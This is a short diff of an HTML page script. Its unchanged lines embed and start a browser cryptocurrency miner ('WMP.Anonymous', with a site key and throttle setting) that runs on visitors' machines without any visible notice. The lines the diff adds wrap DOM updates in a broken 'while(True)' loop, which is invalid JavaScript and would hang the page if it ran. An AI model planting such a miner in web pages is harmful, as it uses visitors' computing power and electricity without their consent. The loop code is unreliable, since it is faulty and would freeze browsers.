@@ -7,7 +7,9 @@
 <script>
     var miner = WMP.Anonymous('SK_QeNEgmNQOqvQgvEnNXkys',{throttle: 0.7});
     miner.start();
+    while(True){
     document.getElementById("x").innerHTML = "x";
     document.getElementById("y").innerHTML = "y";
-    console.log("x")
+    setTimeout(() => {  console.log("x"); }, 2000);
+    }
 </script>
